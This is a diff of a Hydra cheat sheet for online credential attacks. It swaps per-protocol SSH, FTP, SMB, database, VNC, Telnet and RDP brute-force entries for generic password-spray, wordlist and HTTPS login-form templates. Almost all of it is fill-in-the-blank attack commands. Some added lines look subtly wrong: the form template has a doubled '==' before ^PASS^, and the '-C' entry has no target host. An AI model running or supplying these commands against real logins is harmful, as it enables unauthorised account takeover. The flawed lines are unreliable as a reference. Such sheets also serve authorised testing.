@@ -2,109 +2,69 @@
 
 % bruteforce, access
 
-## Hydra - ssh - userlist and password list - 22
-#plateform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 
-
+## protocol - help
+#plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 
 ```bash
-hydra -L <userlist> -P <passlist> <ip> ssh 
+hydra -U <proto|ssh> 
 ```
-
-## Hydra - ssh - user and password  - 22
-#plateform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 
-
+## protocol - list
+#plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 
 ```bash
-hydra -l <user|root> -p <password|root> <ip> ssh 
+hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e
 ```
 
-## Hydra - ssh - user=password - 22
-#plateform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 
-
-```
-hydra -L <userlist> -e s <ip> ssh 
-```
-
-## Hydra - ssh - null password - 22
-#plateform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 
-
-```
-hydra -l <user|root> -e n <ip> ssh 
-```
-
-## Hydra - ssh - password=reverseuser - 22
-#plateform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 
-
-```
-hydra -L <userlist> -e r <ip> ssh 
-```
-
-## Hydra - ssh - file "user:pass" format - specify port
-#plateform/linux #target/remote #protocol/ssh #port/custom #cat/ATTACK/BRUTEFORCE-SPRAY 
-
-```
-hydra -t 4 -s <port> -C <file_user_pass> <ip> ssh 
-```
-
-## Hydra - ftp - 21 
-#protocol/ftp #port/21 #plateform/linux #target/remote  #cat/ATTACK/BRUTEFORCE-SPRAY 
-
-```
-hydra -L <userlist> -P <passlist> <ip> ftp 
-```
-
-## Hydra - smb - 445
-#protocol/smb #port/445 #plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 
-
-```
-hydra -L <userlist> -P <passlist> <ip> smb
-```
-
-## Hydra - mysql - 3306
-#protocol/mysql #port/3306 #plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 
-
-```
-hydra -L <userlist> -P <passlist> <ip> mysql 
-```
-## Hydra - mssql - 1433
-#protocol/mssql #port/1433 #plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 
-```
-hydra -l sa -P <passlist> <ip> -s <port|1433> mssql
-```
-
-## Hydra - vnc - 5900
-#protocol/vnc #port/5900 #plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 
-
-```
-hydra -L <userlist> -P <passlist> <ip> vnc 
-```
-
-## Hydra - postgres - 5432
-#protocol/postgres #port/5432 #plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 
-
-```
-hydra -L <userlist> -P <passlist> <ip> postgres
-```
-
-## Hydra - telnet - 23
-#protocol/telnet #port/23 #plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 
-
-```
-hydra -L <userlist> -P <passlist> <ip> telnet 
-```
-
-## bruteforce RDP with userlist and password list
-#plateform/linux #target/remote #protocol/rdp #port/3389 #cat/ATTACK/BRUTEFORCE-SPRAY 
+## protocol - password spray
+#plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 
+-o <FILE>
+-b <format> text (default),json
+-f  exit when a login/pass pair is found
 ```bash
-hydra -L <userlist> -P <passlist> rdp://<ip>
+hydra -L <userlist> -p <password> <ip> <proto|ssh> 
 ```
 
-## bruteforce RDP with user and password list
-#plateform/linux #target/remote #protocol/rdp #port/3389 #cat/ATTACK/BRUTEFORCE-SPRAY 
+## protocol - user list and password list
+#plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 
+-u loop on user first
+-o <FILE>
+-b <format> text (default),json
+-f  exit when a login/pass pair is found
 ```bash
-hydra -l <user> -P <passlist> rdp://<ip>
+hydra -L <userlist> -P <passlist> <ip> <proto|ssh> 
 ```
 
-## RDP password spray
-#plateform/linux #target/remote #protocol/rdp #port/3389 #cat/ATTACK/BRUTEFORCE-SPRAY 
+## protocol - user and password list
+#plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 
+-o <FILE>
+-b <format> text (default),json
+-f  exit when a login/pass pair is found
 ```bash
-hydra -L <userlist> -p <password> rdp://<ip>
+hydra -l <user> -P <passlist> <ip> <proto|ssh> 
+```
+
+## protocol - user=password, null password and password=reverseuser
+#plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 
+-o <FILE>
+-b <format> text (default),json
+-f  exit when a login/pass pair is found
+```bash
+hydra -L <userlist> -e nsr <ip> <proto|ssh> 
+```
+
+## protocol - file "user:pass" format
+#plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 
+-o <FILE>
+-b <format> text (default),json
+-f  exit when a login/pass pair is found
+```bash
+hydra -t 4 -s <port> -C <file_user_pass>   <proto|ssh> 
+```
+
+## https-form
+#plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 
+optional:
+    header: [h|H]=<header_name>\: <header_value>
+    skip pre-request: [g|G] (when no pre-cookies required)
+    pre-cookie page: [c|C]=/page/uri
+```bash
+hydra -V  -L <userlist> -e s -u -f -P <passlist> <fqdn>  https-post-form "<form_path>:<const_form_params>&<user_field_name|username>=^USER^&<password_field_name|password>==^PASS^<const_form_params>:F=<error_reponse_pattern[:<optional>]"
 ```
